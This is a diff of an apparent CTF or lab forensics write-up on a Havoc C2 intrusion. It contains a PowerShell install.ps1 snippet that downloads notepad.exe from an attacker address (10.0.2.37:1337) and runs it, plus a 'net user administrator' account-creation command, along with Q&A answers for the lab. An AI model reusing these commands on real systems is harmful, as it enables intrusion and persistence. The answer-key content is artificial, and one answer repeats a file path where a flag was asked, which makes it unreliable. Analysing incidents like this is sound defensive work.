@@ -1,5 +1,7 @@
 - **install.ps1**
+
 ![](../../Image/Pasted%20image%2020250423105618.png)
+
 ```
 $aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";
 $LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe";
@@ -9,9 +11,11 @@ Start-Process -Filepath $LA4rJgSPpx
 ```
 
 - **Object list:**
+
 ![](../../Image/Pasted%20image%2020250423105656.png)
 
 - **notepad.exe**
+
 ![](../../Image/Pasted%20image%2020250423105643.png)
 
 - **Havoc Artifact** from network traffic
@@ -43,6 +47,7 @@ Start-Process -Filepath $LA4rJgSPpx
 - What is the Link-local IPv6 Address of the server? Enter the answer exactly as you see it.
 
 ![](../../Image/Pasted%20image%2020250423105228.png)
+
 => **fe80::e134:1b0c:c8d5:3020%6**
 
 - The attacker printed a flag for us to see. What is that flag?
@@ -62,10 +67,12 @@ net user administrator WfD3hz3AXZ4n /add
 - The attacker found an important file on the server. What is the full path of that file?
 
 ![](../../Image/Pasted%20image%2020250423105347.png)
+
 => **C:\Users\paco\Desktop\Files\clients.csv**
 
 - What is the flag found inside the file from question 5?
 
 ![](../../Image/Pasted%20image%2020250423105335.png)
+
 => **C:\Users\paco\Desktop\Files\clients.csv**
 
